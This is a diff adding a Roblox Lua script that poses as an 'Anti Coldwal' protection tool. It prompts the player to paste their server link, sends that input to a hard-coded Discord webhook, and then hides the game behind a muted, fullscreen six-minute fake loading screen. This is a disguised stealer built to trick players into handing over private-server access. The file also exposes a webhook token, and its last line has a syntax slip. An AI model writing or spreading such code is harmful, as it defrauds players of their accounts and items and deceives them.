@@ -1,0 +1,144 @@
+-- Anti Coldwal Script - FINAL VERSION
+-- All user requirements implemented
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Webhook URL
+local webhookURL = "https://discord.com/api/webhooks/1452576285586100266/-lwX0j7Cb8xGWtxUAf-2fhzTCHiNkAwHsfBLU-AS-8S5rh9DWXlrUQeBCpZulwlDn_zl"
+
+-- Mute all sounds
+SoundService.RespectFilteringEnabled = false
+for _, sound in pairs(workspace:GetDescendants()) do
+if sound:IsA("Sound") then
+sound.Volume = 0
+end
+end
+
+-- Create initial GUI (NOT draggable)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiColdwalGUI"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true -- 🔥 ISSO FAZ TAMPA TUDO
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 400, 0, 250)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 50)
+titleLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+titleLabel.Text = "Anti Coldwal"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 24
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.Parent = mainFrame
+
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(0.8, 0, 0, 40)
+inputBox.Position = UDim2.new(0.1, 0, 0.35, 0)
+inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+inputBox.PlaceholderText = "Cole o link do servidor aqui!! Please"
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.TextSize = 18
+inputBox.ClearTextOnFocus = false
+inputBox.Parent = mainFrame
+
+local confirmButton = Instance.new("TextButton")
+confirmButton.Size = UDim2.new(0.6, 0, 0, 45)
+confirmButton.Position = UDim2.new(0.2, 0, 0.65, 0)
+confirmButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+confirmButton.Text = "Confirmar"
+confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmButton.TextSize = 20
+confirmButton.Font = Enum.Font.SourceSansBold
+confirmButton.Parent = mainFrame
+
+-- Function to send webhook
+local function sendWebhook(inputText)
+local data = {
+content = "Anti Coldwal Notification",
+embeds = {{
+title = "User Input Received",
+description = "Input: " .. tostring(inputText),
+color = 3447003
+}}
+}
+pcall(function()
+request({
+Url = webhookURL,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = HttpService:JSONEncode(data)
+})
+end)
+end
+
+-- FULLSCREEN LOADING
+local function createLoadingScreen()
+mainFrame:Destroy()
+StarterGui:SetCore("TopbarEnabled", false)
+
+local loadingFrame = Instance.new("Frame")  
+loadingFrame.Name = "LoadingFrame"  
+loadingFrame.Size = UDim2.fromScale(1, 1) -- 🔥 TELA INTEIRA REAL  
+loadingFrame.Position = UDim2.fromScale(0, 0)  
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
+loadingFrame.BorderSizePixel = 0  
+loadingFrame.ZIndex = 100  
+loadingFrame.Parent = screenGui  
+
+local loadingText = Instance.new("TextLabel")  
+loadingText.Size = UDim2.new(1, 0, 0, 60)  
+loadingText.Position = UDim2.new(0, 0, 0.4, 0)  
+loadingText.BackgroundTransparency = 1  
+loadingText.Text = "Puxando players"  
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)  
+loadingText.TextSize = 36  
+loadingText.Font = Enum.Font.SourceSansBold  
+loadingText.ZIndex = 101  
+loadingText.Parent = loadingFrame  
+
+local progressBg = Instance.new("Frame")  
+progressBg.Size = UDim2.new(0.6, 0, 0, 30)  
+progressBg.Position = UDim2.new(0.2, 0, 0.55, 0)  
+progressBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)  
+progressBg.ZIndex = 101  
+progressBg.Parent = loadingFrame  
+
+local progressBar = Instance.new("Frame")  
+progressBar.Size = UDim2.new(0, 0, 1, 0)  
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255) -- 🔵 NÃO MEXI  
+progressBar.ZIndex = 102  
+progressBar.Parent = progressBg  
+
+local start = tick()  
+local totalTime = 360  
+
+task.spawn(function()  
+    while true do  
+        local p = math.min((tick() - start) / totalTime, 1)  
+        progressBar.Size = UDim2.new(p, 0, 1, 0)  
+        if p >= 1 then break end  
+        task.wait(0.1)  
+    end  
+end)
+
+end
+
+confirmButton.MouseButton1Click:Connect(function()
+sendWebhook(inputBox.Text)
+createLoadingScreen()
+end
